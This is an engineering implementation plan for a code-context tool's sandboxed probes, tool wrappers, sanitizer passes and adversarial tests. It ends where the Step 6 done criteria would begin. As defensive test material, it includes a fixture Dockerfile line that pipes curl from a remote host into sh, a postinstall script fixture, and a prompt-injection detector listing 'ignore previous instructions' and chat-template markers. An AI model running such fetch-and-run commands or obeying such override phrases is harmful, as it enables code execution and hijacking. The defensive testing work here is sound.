# Phase 2 — Context gathering — Layers B–G: High-level implementation plan

**Status:** Implementation plan
**Date:** 2026-05-12
**Architecture reference:** [phase-arch-design.md](phase-arch-design.md)
**ADRs:** [ADRs/](ADRs/)
**Source design:** [final-design.md](final-design.md)
**Roadmap reference:** [docs/roadmap.md](../../roadmap.md) §"Phase 2"

## Executive summary

The engineer fills Layers B–G of the probe inventory atop the frozen Phase 0/1 spine: 17 new probes (5 Layer B, 6 Layer C with C4 class-only, 9 Layer D, `OwnershipProbe` real + 4 Layer E stubs, 6 Layer G), the new `src/codegenie/tools/` chokepoint (one Pydantic-typed wrapper per external CLI: `semgrep`, `syft`, `grype`, `gitleaks`, `scip-typescript`, tree-sitter in-process, `docker`), the new `src/codegenie/skills/` loader package, the conventions / shell-replacements / semgrep-rule-pack / tool-digest catalog expansions, two new `OutputSanitizer` passes (BLAKE3 secret fingerprinter + prompt-injection marker tagger), a rolling-BLAKE3 audit chain head with checkpoint rotation, and per-file findings sub-caches under `.codegenie/cache/<tool>/by-file/`. Eight steps. Foundations first (tools wrappers + sandbox extension + tool-digests + skills loader + catalogs + sanitizer Pass 4/5 + audit chain + coordinator `consumes_peer_outputs` branch), then `IndexHealthProbe` first as the honesty oracle, then the rest of Layers B/C/D/E/G layered onto those primitives, then adversarial + integration + golden + CI-gate hardening. The four ADR-gated in-place Phase 0/1 edits (`probes/__init__.py` registrations, `exec.py` `ALLOWED_BINARIES +6`, `output_sanitizer.py` Pass 4+5, `coordinator.py` one dispatch branch) all land in Step 1; every other delivered file is new.

## Order of operations

The ordering principle is **chokepoints + contracts before consumers, honesty oracle before its sources, dynamic surface before adversarial corpus**. (1) Steps 1–2 plant the sandbox extension, the tools wrappers, the tool-digest pin manifest, the coordinator `consumes_peer_outputs` branch, the schema-evolution policy, the sanitizer Pass 4/5, the audit chain head + rotation, the skills loader, and the catalog expansion — every Phase 2 probe consumes at least one of these primitives. (2) Step 3 builds `IndexHealthProbe` and `BuildGraphProbe` first: `IndexHealthProbe` is the load-bearing Phase 2 probe (the roadmap exit criterion is "surfaces ≥ 3 staleness cases"), and its three-positional-arg dispatch is the only consumer of the new coordinator branch — getting it on disk early validates the contract. `BuildGraphProbe` exercises the `--ignore-scripts` invariant and the wrapper-enforced `ToolInvariantViolation`. (3) Step 4 ships the rest of Layer B (SCIPIndexProbe + NodeReflection + GeneratedCode) — the SCIP binary namespace under `.codegenie/index/` and the SCIP grammar re-validation are non-trivial but isolated. (4) Step 5 ships Layer C static probes — `DockerfileProbe`, `ShellUsageProbe`, `CertificateProbe`, `EntrypointProbe`, plus `RuntimeTraceProbe` class-only with `applies()=False`. (5) Step 6 ships Layer C dynamic probes — `SyftSBOMProbe` (docker build inside sandbox + base-image pull on scoped egress), `GrypeCVEProbe` (DB-update lifecycle). (6) Step 7 ships Layer D + E + G — semgrep with per-file sub-cache, gitleaks with mandatory `--redact`, `OwnershipProbe` + four E stubs, the 9 Layer D Tier-0 probes, plus the per-file findings cache infrastructure. (7) Step 8 lands the ≥ 40 adversarial fixtures, the 7 integration tests (including the three seeded-staleness fixtures), the per-probe goldens, the bench canaries, the two new CI jobs (`conventions_catalog_parity`, `tool_digests_verify`), and the Phase 3 handoff verification. Steps within a band may parallelize; the dependency edges in each step's `Depends on` define the topological constraint.

## Step 1 — Plant sandbox extension, tool wrappers, tool-digest pin manifest, and the four Phase-0/1 in-place edits

**Goal:** Every chokepoint extension Phase 2 probes consume — extended `run_in_sandbox`, the `tools/` wrapper package with seven typed CLI wrappers, the SHA-256 digest pin manifest with install-time verification, and the four ADR-gated in-place edits to `exec.py`, `output_sanitizer.py`, `coordinator.py`, and `probes/__init__.py` — exists on disk and is unit-tested in isolation.

**Features delivered:**
- `src/codegenie/exec.py` extended in place per ADR-0003. New keyword args `network: Literal["none", "scoped"] = "none"`, `scoped_egress_hosts: Sequence[str] = ()`, `ro_bind: Sequence[Path] = ()`. `ALLOWED_BINARIES` extends from `{"git", "node"}` to `{"git", "node", "scip-typescript", "semgrep", "syft", "grype", "gitleaks", "docker"}` (ADR-0005, one combined ADR with per-binary subsections). Credential strip extends to include `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `CHAINGUARD_TOKEN`, plus regex-based stripper for `(?i).*(token|secret|password|key|api_key).*`. Linux `bwrap` + macOS `sandbox-exec` parity preserved.
- `src/codegenie/tools/__init__.py`, `semgrep.py`, `syft.py`, `grype.py`, `gitleaks.py`, `scip_typescript.py`, `treesitter.py`, `docker.py` per `phase-arch-design.md §"Component design" #2`. Each wrapper exports `async run(...) -> <Tool>Result` Pydantic model with `extra="forbid"`. Each routes through `exec.run_in_sandbox(...)` — never `subprocess.run` directly. Each writes raw output to `raw_output_path` *before* parsing. Each raises `ToolNotFound` / `ToolTimeout` / `ToolNonZeroExit` / `ToolOutputMalformed` / `ToolInvariantViolation` typed exceptions. `tools.treesitter.query` uses in-process Python `tree-sitter` bindings (no subprocess).
- `src/codegenie/catalogs/tools/digests.yaml` — SHA-256 pins for `scip-typescript`, `semgrep`, `syft`, `grype`, `gitleaks` plus tree-sitter grammar wheel hashes and rule-pack version digests. Loaded via Phase 1 `safe_yaml.load` at module import; `MappingProxyType` wrapped; hard fail on malformed YAML (`CatalogLoadError`).
- New CI script `scripts/check_tool_digests.py` — verifies every binary on `$PATH` matches its pinned SHA-256 at install time. Wired into a new `tool_digests_verify` CI job.
- `src/codegenie/output_sanitizer.py` extended in place per ADR-0006: `_pass4_secret_fingerprinter` (BLAKE3 fingerprint of `match|secret|finding|raw|context|value` field-name matches → `{content_hash, entropy_band, length}`) and `_pass5_prompt_injection_marker` (marker patterns `<\|im_start\|>`, `[INST]`, `<<SYS>>`, `ignore previous instructions` on strings > 256 chars; emits `prompt_injection_marker_count` metadata; preserves string verbatim). Both passes idempotent. `scrub()` signature unchanged.
- `src/codegenie/coordinator.py` extended in place per ADR-0001: one new branch in `_dispatch` for `getattr(probe, "consumes_peer_outputs", False)`. Helper `_build_frozen_peer_snapshot()` returns `MappingProxyType` view over post-sanitization `ProbeOutput` mapping; constructed once per gather. `inspect.signature` registration-time check enforces three-arg `run()` signature on consumers; mismatch → `ProbeRegistrationError`; CLI exits 2 at startup. `ProbeContext` public field set unchanged.
- `src/codegenie/probes/base.py` — `Probe.consumes_peer_outputs: ClassVar[bool] = False` added as optional class attribute, default `False`. The snapshot test (`tests/unit/test_probe_contract.py`) regenerates with the documented attribute addition. This is the **only** ABC edit in Phase 2.
- `src/codegenie/audit_writer.py` extended in place per ADR-0011: rolling BLAKE3 chain head per gather. Each record carries `previous_hash` + `chain_head`. Chain head written to `runs/<utc>-<short>.json#chain_head`. `verify_previous_chain_head()` runs at next gather start; mismatch emits `audit.chain_break_detected` event (observability only; gather continues). **Rollover checkpoints** per Gap 4 of `phase-arch-design.md`: every 100 gathers a `runs/checkpoints/<rollover_index>.json` checkpoint is written; older records may be archived to `runs/archive/<rollover_index>/`.
- `src/codegenie/errors.py` extended: `ToolNotFound`, `ToolTimeout`, `ToolNonZeroExit`, `ToolOutputMalformed`, `ToolInvariantViolation`, `SandboxLaunchError`, `SkillLoadError`, `CatalogLintMismatch`, `AuditChainBreakDetected` (observability event).
- New structlog event names registered in `src/codegenie/logging.py` constants: `probe.tool.invoked`, `probe.sandbox.network_egress_attempted`, `probe.sanitizer.pass4_fingerprint`, `probe.sanitizer.pass5_marker_detected`, `audit.chain_head.advanced`, `audit.chain_break.detected`, `probe.peer_outputs.snapshot_built`, `index_health.budget_exceeded`. Two new structured fields: `tool_name`, `sandbox_network`.
- ADRs in `docs/phases/02-context-gather-layers-b-g/ADRs/` created: ADR-0001 (`consumes_peer_outputs` class attribute + frozen peer-output positional arg), ADR-0003 (extend `run_in_sandbox` chokepoint; no new `SandboxStrategy`), ADR-0004 (`tools/digests.yaml` SHA-256 pin manifest + install-time verification), ADR-0005 (extend `ALLOWED_BINARIES` by six), ADR-0006 (`OutputSanitizer` Pass 4 + Pass 5), ADR-0011 (rolling BLAKE3 audit chain head + rollover checkpoints).

**Done criteria:**
- [ ] `tests/unit/tools/test_<wrapper>.py` for each of the seven wrappers — recorded-fixture happy path, non-zero exit, timeout, malformed JSON, missing binary (`ToolNotFound`); ≥ 4 tests per wrapper.
- [ ] `tests/unit/exec/test_run_in_sandbox_network.py` — `network="none"` default; `network="scoped"` with allowlist enforced; `bwrap --unshare-net` invoked on Linux; `sandbox-exec` `(deny network*)` profile on macOS.
- [ ] `tests/unit/exec/test_allowed_binaries.py` extended — all eight binaries in `ALLOWED_BINARIES`; env-strip includes new credential names + regex stripper.
- [ ] `tests/unit/sanitizer/test_pass4_fingerprinter.py` — every `match|secret|finding|raw|context|value` field rewritten to `{content_hash, entropy_band, length}`; raw bytes never appear in output; idempotent (`pass4(pass4(x)) == pass4(x)`).
- [ ] `tests/unit/sanitizer/test_pass5_prompt_injection.py` — markers detected on strings > 256 chars; `prompt_injection_marker_count` emitted; original string preserved verbatim.
- [ ] `tests/unit/coordinator/test_peer_output_binding.py` — `consumes_peer_outputs = True` probe receives three-arg signature; other probes see two-arg; `inspect.signature` registration-time check fires on mismatch.
- [ ] `tests/unit/audit/test_chain_head.py` — `chain_head` advances by one per gather; `verify_previous_chain_head` detects break; observability event fires; rollover checkpoint written at 100-gather boundary.
- [ ] `tests/unit/catalogs/test_tool_digests.py` — malformed YAML → `CatalogLoadError`; valid digests round-trip; `MappingProxyType` immutability.
- [ ] `scripts/check_tool_digests.py` runs against the CI matrix and verifies installed binary SHA-256 against the manifest; CI job `tool_digests_verify` is green.
- [ ] `tests/unit/test_probe_contract.py` snapshot regenerated with the `consumes_peer_outputs` class attribute documented; subsequent ABC edits fail.
- [ ] All Step 1 code passes strict mypy.
- [ ] Phase 0/1 `fence` CI job stays green (no LLM SDK; no `httpx`/`requests`/`socket`/`urllib3` under `src/codegenie/`; no `tantivy` in default deps).

**Depends on:** Phase 1 shipped and `main` green.

**Effort:** L — densest step in the phase. Seven tool wrappers, the sandbox extension, two sanitizer passes, the audit chain head with rotation, the coordinator dispatch branch, the digest pin manifest with its CI verifier, and six ADRs all land here. Splitting threshold: if Step 1's PR exceeds 1,800 LOC, split into Step 1a (sandbox + `exec.py` + `tools/` wrappers + digests + ADR-0003/0004/0005) and Step 1b (sanitizer Pass 4/5 + audit chain + coordinator branch + ADR-0001/0006/0011). Steps 2–8 unchanged.

**Risks specific to this step:** The seven tool wrappers are tested entirely against recorded fixtures (`tests/fixtures/tool_outputs/`) — the *parity* between recorded output and real-binary output across tool versions is enforced by the digest manifest. The `bwrap` invocation profile for `docker build` (Open Question #1) may require `docker buildx --driver=docker-container` — if integration fails in Step 6, fall back to `confidence: low` with structured warning, file follow-up. The macOS `sandbox-exec` `--network=none` is best-effort (documented limitation); the startup banner must surface this so CI on macOS doesn't silently pass adversarial-network tests. The `consumes_peer_outputs` ABC addition is the only Phase-0 contract amendment in Phase 2 — encode the allowed-attribute list in the snapshot regeneration script so a third attribute can't slip in later.

## Step 2 — Plant skills loader, catalog expansion, schema-evolution policy, conventions parity lint

**Goal:** Every catalog and loader Phase 2 probes consume — Skills loader package, conventions / shell-replacements / semgrep-rule-pack catalogs with closed-enum schema + parity lint, the `schema_version: "v1"` policy doc, and per-probe sub-schema versioning in the cache key — exists on disk and is unit-tested.

**Features delivered:**
- `src/codegenie/skills/__init__.py`, `loader.py`, `models.py`, `schema/skill.schema.json` per `phase-arch-design.md §"Component design" #3`. `discover_skills(roots: Sequence[Path]) -> SkillIndex` accepts **absolute paths only**; CLI resolves `~/.codegenie/skills/` + env vars + config *before* calling. Frontmatter parsed via Phase 1 `safe_yaml.load` (5 MB cap, depth 64). Body **never loaded** — only `body_char_count = os.stat(body_path).st_size - frontmatter_byte_size`. `required_tools` cross-referenced against `tools/digests.yaml`; unpinned tool → `applicability: degraded`. Symlinks not followed (Phase 1 `O_NOFOLLOW`). Malformed YAML / schema violation → `SkillLoadError`; CLI exits 2.
- `src/codegenie/catalogs/conventions/_schema.json` + `node.yaml` per `phase-arch-design.md §"Component design" #4`. Closed enum on `detect.type`: `["file_present", "package_dep", "regex_in_file", "tsconfig_field", "dockerfile_directive"]`. `additionalProperties: false` at root. `schema_version: "v1"` required at root.
- `src/codegenie/catalogs/shell_replacements/_schema.json` + `node.yaml` — shell-builtin replacement catalog consumed by `ShellUsageProbe`. Closed enum on replacement type. `schema_version: "v1"` required.
- `src/codegenie/catalogs/semgrep_rule_packs.yaml` + `_schema.json` — declares which rule packs apply per task. Closed enum on `task_types`. Cross-referenced against `tools/digests.yaml` rule-pack-version digests.
- New CI scripts:
  - `scripts/check_conventions_catalog_parity.py` (ADR-0008) — asserts `match/case` branches in `src/codegenie/probes/convention.py`'s `_apply_detector` function set-equals the `detect.type.enum` set in `_schema.json`. Asymmetry → CI red.
  - `scripts/check_skill_schema_versions.py` (Gap 2) — every SKILL.md under pinned roots declares `schema_version: "v1"`.
  - `scripts/check_conventions_schema_versions.py` (Gap 2) — every catalog YAML declares `schema_version: "v1"` at root.
  - Wired into a new `conventions_catalog_parity` CI job.
- `docs/phases/02-context-gather-layers-b-g/SCHEMA-EVOLUTION-POLICY.md` (Gap 1) — declares the v1/v2 evolution policy: additive evolution → minor bump (`v1 → v1.1`); breaking → major bump (`v1 → v2`) requires Phase-level ADR amendment + migration handler in coordinator. Every Phase 2 sub-schema roots `schema_version: "v1"`.
- Coordinator cache-key derivation extended (additive): per-probe `sub_schema_version` participates in `cache_key` alongside Phase 1's identity hash. Any sub-schema version bump invalidates the relevant probe's cache entries (cache flush on any minor bump, per Open Question #9 default).
- ADRs created: ADR-0002 (defer `RuntimeTraceProbe (C4)` as class + sub-schema with `applies()=False`), ADR-0007 (`BuildGraphProbe` `--ignore-scripts` invariant + `resolution_status` field), ADR-0008 (conventions catalog closed-enum + CI parity lint), ADR-0009 (`ExternalDocsProbe` filesystem-only in Phase 2; URL fetcher deferred), ADR-0010 (`tantivy` opt-in via `codegenie[search]` extra), ADR-0012 (`--strict` + `--strict-domains` CLI flag for `IndexHealthProbe`).

**Done criteria:**
- [ ] `tests/unit/skills/test_loader.py` — happy path on a fixture directory of 5 skills; malformed YAML → `SkillLoadError`; missing root → empty `SkillIndex`; symlink skipped with warning; `required_tools` cross-check against `tools/digests.yaml` produces `degraded` applicability for unpinned tools.
- [ ] `tests/unit/skills/test_indexing.py` — `by_task_and_language` lookup is idempotent (Hypothesis property test); schema validation passes Draft 2020-12.
- [ ] `tests/unit/skills/test_no_home_expansion.py` — loader given a path containing `~` does **not** expand it (CLI's job); test passes a literal `"~/.codegenie/skills/"` path string and asserts `FileNotFoundError` or empty index (not silent expansion).
- [ ] `tests/unit/catalogs/test_conventions_schema.py` — closed-enum validation; malformed catalog YAML → `CatalogLoadError`.
- [ ] `tests/unit/catalogs/test_shell_replacements_schema.py` — closed-enum validation.
- [ ] `tests/unit/catalogs/test_semgrep_rule_packs.py` — closed-enum on `task_types`; rule-pack-version digests reference `tools/digests.yaml`.
- [ ] `scripts/check_conventions_catalog_parity.py` runs in CI and is green when `match/case` ↔ enum match; a synthetic mismatch fails CI as expected (test fixture).
- [ ] `scripts/check_skill_schema_versions.py` and `scripts/check_conventions_schema_versions.py` both run in CI and verify every Phase 2 catalog + skill declares `schema_version: "v1"`.
- [ ] `SCHEMA-EVOLUTION-POLICY.md` exists; cross-linked from README + every Phase 2 sub-schema's root comment.
- [ ] `tests/unit/coordinator/test_cache_key_includes_sub_schema_version.py` — Hypothesis property test: any `sub_schema_version` change ⇒ `cache_key` change.
- [ ] All Step 2 code passes strict mypy.

**Depends on:** Step 1 (tools wrappers + digests + sandbox extension).

**Effort:** M — Skills loader is straightforward (one YAML + Pydantic + stat()), but the three new CI lint scripts + the schema-evolution policy doc + six ADRs add review surface. The closed-enum CI lint is the load-bearing discipline: it forces Phase 7's distroless `detect.type` additions to update both code and schema in the same PR.

**Risks specific to this step:** The Skills loader's "no `~/` expansion" invariant is the cache-key correctness contract — if `discover_skills` ever calls `Path.expanduser()`, the cache key leaks `$HOME` and two developers on different machines diverge. Encode the no-expansion contract in `test_no_home_expansion.py` and assert it both ways (path with `~` not expanded; absolute path round-trips identically). The conventions parity lint must run **before** unit tests in the CI workflow — if a developer lands a `match/case` branch without the enum entry, every unit test that exercises that branch fails confusingly; the lint surfaces the cause cleanly.

## Step 3 — Ship `IndexHealthProbe` (B2) and `BuildGraphProbe` (B5)

**Goal:** The load-bearing Phase 2 probe (`IndexHealthProbe`) is on disk; the only consumer of the new `consumes_peer_outputs` coordinator branch validates end-to-end; the `BuildGraphProbe` invariant `--ignore-scripts` is enforced and exercised against a postinstall-RCE-attempt fixture.

**Features delivered:**
- `src/codegenie/probes/index_health.py` per `phase-arch-design.md §"Component design" #5`. `consumes_peer_outputs = True`. `requires = ["scip_index", "syft_sbom", "grype_cve", "semgrep", "gitleaks", "runtime_trace"]`. `cache_strategy = "none"` (always re-runs). Per-domain rollup for `scip`, `sbom`, `cve`, `semgrep`, `gitleaks`, `runtime_trace`. Each domain emits `{last_indexed_commit, commits_behind, coverage_pct, indexer_errors, tool_digest_in_use, confidence, status}`. `runtime_trace` domain: `{status: "not_applicable", reason: "C4 deferred to Phase 5"}`. Single subprocess: `git rev-list --count <last_indexed_commit>..HEAD` (Open Question #7: default in-process via `gitpython`; fallback subprocess sandbox). Advisory 200 ms budget; `index_health.budget_exceeded: true` on overrun. Never fails the gather; `--strict` is the CI hammer.
- `src/codegenie/probes/build_graph.py` per `phase-arch-design.md §"Component design" #6`. Two stages: (1) static parse via Phase 1 `ParsedManifestMemo` — always runs; (2) resolved parse via `tools.<pm>.run` only if PM on `$PATH` AND repo is monorepo. **`--ignore-scripts` is mandatory**; wrapper enforces; missing flag → `ToolInvariantViolation`. Emits `resolution_status: "static_only" | "resolved" | "resolved_with_discrepancy"`. Legacy npm without `--ignore-scripts` support → wrapper raises; probe falls back to static-only.
- `src/codegenie/schema/probes/index_health.schema.json` per `phase-arch-design.md §"Data model"`. `IndexHealthSlice` with `scip`, `sbom`, `cve`, `semgrep`, `gitleaks` of `DomainHealth | null` + `runtime_trace` of `DeferredDomainHealth` + `confidence_summary` (canonical Phase 8 shape) + `budget_exceeded`. `additionalProperties: false` at root + every nested block. `schema_version: "v1"`.
- `src/codegenie/schema/probes/build_graph.schema.json` per `phase-arch-design.md §"Data model"`. `BuildGraphSlice` with `resolution_status`, `declared_edges`, `resolved_edges`, `workspaces`. `additionalProperties: false`. `schema_version: "v1"`.
- Envelope cross-probe `if/then` rule (`src/codegenie/schema/repo_context.schema.json`): `if probes.cve_scan present then probes.index_health.cve.confidence required`.
- `src/codegenie/cli.py` extended for `--strict` and `--strict-domains <list>` flags per ADR-0012. `--strict` exits 3 on **any** B2 domain `low`. `--strict-domains cve` exits 3 only on `cve` domain `low`. Envelope is written before exit.
- `src/codegenie/probes/__init__.py` — registers `IndexHealthProbe` and `BuildGraphProbe` via explicit import.
- Fixtures `tests/fixtures/node_typescript_with_b_through_g/` (a minimal NestJS-shaped TS monorepo with pnpm workspaces) + `tests/fixtures/postinstall_rce_attempt/` (`package.json` with `scripts.postinstall: "touch /tmp/POWNED"`).

**Done criteria:**
- [ ] `tests/unit/probes/test_index_health.py` — per-domain rollup correct on synthetic peer-output mappings; `runtime_trace` domain emits `not_applicable`; budget breach emits `budget_exceeded: true` without failing; never fails the gather; missing peer → `status: "failed_upstream"`, `confidence: low`.
- [ ] `tests/unit/probes/test_index_health_strict.py` — `--strict` exits 3 on any low; `--strict-domains cve` exits 3 only on `cve` low; default (no flag) exits 0.
- [ ] `tests/unit/probes/test_build_graph.py` — static-only path (no PM on `$PATH`); resolved path (PM on `$PATH`, monorepo); `resolved_with_discrepancy` when graphs differ; `--ignore-scripts` wrapper enforcement; `ToolInvariantViolation` on missing flag.
- [ ] `tests/adv/test_buildgraph_postinstall_blocked.py` — runs `BuildGraphProbe` against `postinstall_rce_attempt/` fixture; `/tmp/POWNED` does NOT exist after run.
- [ ] `tests/integration/probes/test_index_health_peer_output_binding.py` — `IndexHealthProbe.run()` receives the three-positional-arg signature with a frozen `MappingProxyType`; mutation attempt raises `TypeError`.
- [ ] Envelope `if/then` rule enforced: synthetic envelope with `cve_scan` present but `index_health.cve.confidence` absent → `SchemaValidationError`.
- [ ] All Step 3 code passes strict mypy.

**Depends on:** Step 1 (coordinator branch, tools wrappers) + Step 2 (catalogs, schema-evolution policy).

**Effort:** M — `IndexHealthProbe`'s per-domain rollup logic is mechanical once the snapshot contract is clean; `BuildGraphProbe`'s static-vs-resolved is similar to Phase 1's lockfile parsing in shape. The `--strict-domains` CLI flag and envelope `if/then` rule are the load-bearing pieces.

**Risks specific to this step:** `IndexHealthProbe` is the only probe in Phase 2 that uses the `consumes_peer_outputs` path; if the coordinator branch has a bug, this probe is where it surfaces. The `--ignore-scripts` invariant must be enforced **inside the wrapper**, not the probe — otherwise a future probe author writing `tools.pnpm.run(..., flags=["list", "-r"])` (without `--ignore-scripts`) opens the RCE path. The adversarial test pins the wrapper-level invariant. The `gitpython` vs subprocess decision (Open Question #7) defaults to `gitpython` for ~50 ms latency win; if portfolio-scale `gitpython` proves unreliable, Phase 14 flips the default.

## Step 4 — Ship Layer B remainder: `SCIPIndexProbe`, `NodeReflectionProbe`, `GeneratedCodeProbe`

**Goal:** Layer B is complete. The SCIP binary namespace under `.codegenie/index/` is on disk with grammar re-validation. The two tree-sitter-based probes consume the in-process wrapper with per-file findings sub-cache.

**Features delivered:**
- `src/codegenie/probes/scip_index.py` per `phase-arch-design.md §"Component design" #7`. Calls `tools.scip_typescript.run(...)` with `raw_output_path = <repo>/.codegenie/index/scip-index.scip`. `node_modules` policy: if present, read-only mount into sandbox; if absent, **never** invoke `npm install` — emits `node_modules_present: false, lockfiles_resolved: true, coverage_pct: <reduced>, confidence: medium`. Cache key includes `scip-typescript` digest. SCIP binary re-validated against protobuf grammar before merging. **Per-repo binary lifecycle** — never under `cache/`; manual `cache prune-index`.
- `src/codegenie/probes/node_reflection.py` — consumes `tools.treesitter.query` against `probes/_reflection_queries/node.yaml`. Per-file cache hit at `.codegenie/cache/tree-sitter/by-file/<blake3>.<grammar_version>.msgpack`. Emits reflection metadata (`new Function(...)`, `eval(...)`, `Reflect.*` call sites).
- `src/codegenie/probes/generated_code.py` — consumes tree-sitter on ambiguous files only (matched against `probes/_generated_code_patterns.yaml`). Detects generator markers (`// @generated`, `protoc`, OpenAPI codegen).
- Sub-schemas: `src/codegenie/schema/probes/scip_index.schema.json`, `node_reflection.schema.json`, `generated_code.schema.json` per `phase-arch-design.md §"Data model"`. `additionalProperties: false`. `schema_version: "v1"`.
- `src/codegenie/probes/_reflection_queries/node.yaml` — pinned tree-sitter query pack.
- `src/codegenie/probes/_generated_code_patterns.yaml` — pinned pattern catalog.
- `src/codegenie/probes/__init__.py` — registers the three new probes.
- `cache gc` subcommand extended (`src/codegenie/cli.py`) — does NOT touch `.codegenie/index/scip-index.scip`; manual `cache prune-index` for the SCIP binary.

**Done criteria:**
- [ ] `tests/unit/probes/test_scip_index.py` — `node_modules` present (mounted) vs absent (`confidence: medium`); grammar re-validation rejects truncated `.scip`; tool digest in cache key.
- [ ] `tests/adv/test_truncated_scip_index.py` — truncated `.scip` file; grammar re-validation fails; probe `confidence: low`; no OOM.
- [ ] `tests/adv/test_scip_compiler_plugin_attempt.py` — hostile `tsconfig.json` `extends:` chain; sandbox contains; no host file modified.
- [ ] `tests/unit/probes/test_node_reflection.py` — tree-sitter query pack produces expected reflection markers on a fixture with `eval()` + `new Function()` + `Reflect.get()`; per-file cache hit on second run.
- [ ] `tests/unit/probes/test_generated_code.py` — generator markers detected; ambiguous files routed via tree-sitter; per-file cache hit.
- [ ] `tests/adv/test_treesitter_grammar_version_mismatch.py` — wrong grammar version pinned; wrapper raises `ToolOutputMalformed`.
- [ ] All Step 4 code passes strict mypy.

**Depends on:** Step 1 (tools wrappers, sandbox extension) + Step 2 (catalogs) + Step 3 (`IndexHealthProbe` requires `scip_index`).

**Effort:** M — `SCIPIndexProbe` is the longest-running Phase 2 probe (~25 s cold on 1k-file fixture), but the wrapper does the heavy lifting; the probe is a thin orchestration. The two tree-sitter probes are similar shape: load query pack, dispatch to wrapper, write findings via per-file cache.

**Risks specific to this step:** The `.codegenie/index/` lifecycle is **not** the same as `.codegenie/cache/` — the SCIP binary is per-repo, rewritten in place, never auto-deleted. If `cache gc` deletes it by accident, the next gather is a full re-index (correct behavior, slow). Document the distinction in `cache gc` help text. Tree-sitter's grammar version pin is enforced by `tools/digests.yaml`; a wheel-upgrade PR that misses the digest update fails the install-time CI check (Step 1's `tool_digests_verify` job).

## Step 5 — Ship Layer C static probes: `DockerfileProbe`, `ShellUsageProbe`, `CertificateProbe`, `EntrypointProbe`, plus `RuntimeTraceProbe` class-only

**Goal:** Layer C static evidence is complete. `RuntimeTraceProbe` lands as a registered probe with `applies()=False` and a constant-content sub-schema so `IndexHealthProbe`'s `runtime_trace` domain can read it.

**Features delivered:**
- `src/codegenie/probes/dockerfile.py` per `phase-arch-design.md §"Component design" #12`. Uses the `dockerfile` Python library (pure-Python parser). Emits parsed instructions, multi-stage detection, `RUN` shape, ports, entrypoint form. `confidence: medium` on unresolvable variable interpolation.
- `src/codegenie/probes/shell_usage.py` per `phase-arch-design.md §"Component design" #11`. Walks Dockerfile `RUN` directives + `shell_replacements/node.yaml` catalog. Emits replacement-candidate list. Declares `runtime_trace_pending: true` where static evidence is incomplete.
- `src/codegenie/probes/certificate.py` — walks Dockerfile for `COPY ... *.crt` / `ADD ... *.pem` + `apt-get install ca-certificates`.
- `src/codegenie/probes/entrypoint.py` — extracts `ENTRYPOINT` / `CMD` from `DockerfileProbe` slice; classifies form (exec vs shell).
- `src/codegenie/probes/runtime_trace.py` per `phase-arch-design.md §"Component design" #10` + Gap 3. **Probe registers** in `__init__.py` like every other probe. **`applies()` returns `False` unconditionally.** **Sub-schema declares** `runtime_trace: {status: "deferred_to_phase_5", reason: str}` with `additionalProperties: false` at root. **Constant-content `ProbeOutput`** computed once at coordinator startup and cached forever in Phase 2; included in the frozen `peer_outputs` snapshot so `IndexHealthProbe`'s `runtime_trace` domain reads `status: "not_applicable"`.
- Sub-schemas: `dockerfile.schema.json`, `shell_usage.schema.json`, `certificate.schema.json`, `entrypoint.schema.json`, `runtime_trace.schema.json` per `phase-arch-design.md §"Data model"`. All `additionalProperties: false`, `schema_version: "v1"`.
- `src/codegenie/probes/__init__.py` — registers the five new probes.
- New pip dep: `dockerfile` (pure-Python, pinned in `pyproject.toml` `[dependencies]`; CVE-pin via `tools/digests.yaml` wheel hash).
- ADR-0002 (`RuntimeTraceProbe` deferral) reaffirmed with the Gap-3 concrete contract.

**Done criteria:**
- [ ] `tests/unit/probes/test_dockerfile.py` — multi-stage detection; `RUN` shape extraction; entrypoint form classification; malformed Dockerfile → `confidence: low`.
- [ ] `tests/unit/probes/test_shell_usage.py` — shell-builtin replacement candidates from catalog; `runtime_trace_pending: true` on incomplete static evidence.
- [ ] `tests/unit/probes/test_certificate.py` — `COPY *.crt` + `apt-get install ca-certificates` detection.
- [ ] `tests/unit/probes/test_entrypoint.py` — exec form (`["node", "app.js"]`) vs shell form (`node app.js`).
- [ ] `tests/unit/probes/test_runtime_trace_deferred.py` — `applies()=False`; constant-content slice emits `status: "deferred_to_phase_5"`; sub-schema validates the constant content; `IndexHealthProbe`'s `runtime_trace` domain reads `not_applicable`.
- [ ] All Step 5 code passes strict mypy.

**Depends on:** Step 1 + Step 2 + Step 3 (`IndexHealthProbe` consumes `runtime_trace`).

**Effort:** S — five probes of small surface area (each < 100 LOC); the longest piece is the `dockerfile` library integration and `RuntimeTraceProbe`'s constant-content `ProbeOutput` contract.

**Risks specific to this step:** `RuntimeTraceProbe`'s constant-content `ProbeOutput` must round-trip through the sanitizer's five passes without mutation — test explicitly. The `dockerfile` Python library is a new external dep; pin by wheel hash + include in the `security` job's `pip-audit`/`osv-scanner` closure.

## Step 6 — Ship Layer C dynamic probes: `SyftSBOMProbe`, `GrypeCVEProbe`

**Goal:** The two probes that exercise `docker build` inside the sandbox and `grype db update` with scoped egress are on disk. Hostile-Dockerfile defense is end-to-end exercised against a `RUN curl ... | sh` fixture.

**Features delivered:**
- `src/codegenie/probes/syft_sbom.py` per `phase-arch-design.md §"Component design" #8`. `requires = ["dockerfile"]`. Cache key includes `(dockerfile_hash, dockerignore_hash, lockfile_hash, base_image_digest_at_registry, syft_digest, probe_version, schema_version)`. Base-image digest via `docker manifest inspect`; LRU-cached 1 hour per `base_image_ref` in `tools.docker`. On cache miss: `docker build` inside sandbox with `--network=none` for build steps; `network="scoped"` allowlisted to configured registry host for the initial base-image pull. Then `tools.syft.run`. Records `build_status`, `network_egress_attempted`.
- `src/codegenie/probes/grype_cve.py` per `phase-arch-design.md §"Component design" #9`. `requires = ["syft_sbom"]` (consumes peer output). `grype db check` lifecycle; if DB older than `grype.db_update_max_age_hours` (default 24), `grype db update` runs with `network="scoped"` allowlisted to the grype DB host. DB integrity verified against `tools/grype-db-listing.signed.json` pin. Trivy cross-check opt-in via `--paranoid`; default grype-only.
- Sub-schemas: `syft_sbom.schema.json`, `grype_cve.schema.json` per `phase-arch-design.md §"Data model"`. `SBOMSlice` + `SBOMPackage` + `CVESlice` + `CVEMatch`. `additionalProperties: false`. `schema_version: "v1"`.
- `src/codegenie/catalogs/tools/grype-db-listing.signed.json` — pinned grype DB listing for integrity verification.
- `src/codegenie/probes/__init__.py` — registers the two new probes.
- Fixture: `tests/fixtures/hostile_dockerfile_curl/` with `RUN curl http://1.1.1.1 | sh`.

**Done criteria:**
